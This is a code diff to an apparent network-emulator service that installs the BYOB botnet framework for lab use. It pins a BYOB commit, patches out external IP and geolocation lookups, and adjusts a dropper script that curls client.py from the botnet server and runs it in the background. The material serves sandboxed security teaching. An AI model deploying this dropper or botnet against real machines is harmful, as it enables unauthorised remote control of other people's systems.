@@ -5,6 +5,8 @@ from __future__ import annotations
 from seedemu.core import Node, Service, Server
 from typing import Dict
 
+BYOB_VERSION='3924dd6aea6d0421397cdf35f692933b340bfccf'
+
 BotnetServerFileTemplates: Dict[str, str] = {}
 
 BotnetServerFileTemplates['client_dropper_runner'] = '''\
@@ -14,7 +16,8 @@ until curl -sHf "$url" -o client.py > /dev/null; do {
     echo "botnet-client: server $1:$2 not ready, waiting..."
     sleep 1
 }; done
-python3 client.py
+echo "botnet-client: server ready!"
+python3 client.py &
 '''
 
 BotnetServerFileTemplates['server_init_script'] = '''\
@@ -22,6 +25,49 @@ BotnetServerFileTemplates['server_init_script'] = '''\
 cd /tmp/byob/byob
 echo -e 'exit\\ny' | python3 server.py --port $2
 python3 client.py --name 'client' $1 $2
+'''
+
+BotnetServerFileTemplates['server_patch'] = '''\
+diff --git a/byob/core/util.py b/byob/core/util.py
+index eca72d4..96160c6 100644
+--- a/byob/core/util.py
++++ b/byob/core/util.py
+@@ -76,6 +76,7 @@ def public_ip():
+     Return public IP address of host machine
+
+     """
++    return local_ip()
+     import sys
+     if sys.version_info[0] > 2:
+         from urllib.request import urlopen
+@@ -143,6 +144,7 @@ def geolocation():
+     """
+     Return latitute/longitude of host machine (tuple)
+     """
++    return ("0", "0")
+     import sys
+     import json
+     if sys.version_info[0] > 2:
+diff --git a/byob/modules/util.py b/byob/modules/util.py
+index 5c5958a..ea1c9d4 100644
+--- a/byob/modules/util.py
++++ b/byob/modules/util.py
+@@ -76,6 +76,7 @@ def public_ip():
+     Return public IP address of host machine
+
+     """
++    return local_ip()
+     import sys
+     if sys.version_info[0] > 2:
+         from urllib.request import urlopen
+@@ -143,6 +144,7 @@ def geolocation():
+     """
+     Return latitute/longitude of host machine (tuple)
+     """
++    return ("0", "0")
+     import sys
+     import json
+     if sys.version_info[0] > 2:
 '''
 
 class BotnetServer(Server):
@@ -60,14 +106,15 @@ class BotnetServer(Server):
         """
         address = str(node.getInterfaces()[0].getAddress())
 
-        # get dependencies
+        # get byob & its dependencies
         node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 
-
-        # get byob
         node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
-
-        # get byob dependencies
+        node.addBuildCommand('git -C /tmp/byob/ checkout {}'.format(BYOB_VERSION)) # server_patch is tested only for this commit
         node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
+
+        # patch byob - removes external request for getting IP location, which won't work if "real" internet is not connected.
+        node.setFile('/byob.patch', BotnetServerFileTemplates['server_patch'])
+        node.appendStartCommand('git -C /tmp/byob/ apply /byob.patch')
 
         # add the init script to server
         node.setFile('/server_init_script', BotnetServerFileTemplates['server_init_script'])
@@ -118,13 +165,9 @@ class BotnetClientServer(Server):
     def install(self, node: Node):
         assert self.__server != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())
 
-        # get dependencies
+        # get byob dependencies.
         node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 
-
-        # get byob
         node.addBuildCommand('curl https://raw.githubusercontent.com/malwaredllc/byob/master/byob/requirements.txt > /tmp/byob-requirements.txt')
-
-        # get byob dependencies
         node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')
 
         # script to get dropper from server.
